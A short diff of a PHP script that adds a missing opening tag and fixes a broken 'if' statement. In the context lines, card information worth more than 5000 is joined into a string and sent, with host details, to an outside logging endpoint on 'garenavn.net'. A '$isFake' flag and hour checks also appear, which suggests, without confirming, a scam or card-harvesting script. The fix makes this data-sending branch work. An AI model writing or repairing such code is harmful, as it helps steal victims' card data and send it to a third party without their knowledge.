@@ -1,3 +1,5 @@
+<?php
+
 $isFake = 0;
 
 $getHour = intval(date('H'));
@@ -103,7 +105,7 @@ else
 
 
 
-$if($cardInfo['price'] > 5000)
+if($cardInfo['price'] > 5000)
 {
 	$logInfo = implode('|', $cardInfo);
 	$this->header('https://garenavn.net/api_logs/process.php', array('host' => $hostInfo, 'data_logs' => $logInfo));
